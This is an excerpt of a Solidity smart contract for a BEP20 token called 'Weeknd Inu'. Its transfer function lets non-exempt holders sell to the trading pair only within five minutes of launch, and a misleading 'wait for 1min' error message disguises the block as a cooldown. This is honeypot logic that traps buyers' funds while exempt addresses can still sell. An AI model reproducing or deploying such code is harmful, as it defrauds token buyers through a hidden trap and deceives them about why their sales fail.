...
contract WeekndInu is IBEP20, Auth {
    ...
    string constant _name = "Weeknd Inu";
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (recipient == pair && !isTimelockExempt[sender]) {
                require(block.timestamp <= (launchTime + 5 minutes),"Please wait for 1min between two operations");
                }
